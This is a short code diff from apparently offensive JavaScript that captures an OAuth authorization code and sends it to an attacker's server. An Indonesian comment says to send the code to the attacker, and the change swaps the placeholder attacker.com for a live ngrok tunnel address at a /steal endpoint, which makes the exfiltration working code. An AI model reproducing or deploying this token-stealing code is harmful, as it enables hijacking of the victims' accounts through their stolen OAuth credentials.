@@ -34,7 +34,7 @@
                         console.log("OAuth Code:", oauthCode);
                         // Kirim kode ke server penyerang
                         var xhr = new XMLHttpRequest();
-                        xhr.open("GET", "https://attacker.com/steal?token=" + encodeURIComponent(oauthCode), true);
+                        xhr.open("GET", "https://bd72-36-73-33-194.ngrok-free.app/steal?token=" + encodeURIComponent(oauthCode), true);
                         xhr.send();
                     }
                 } catch (e) {
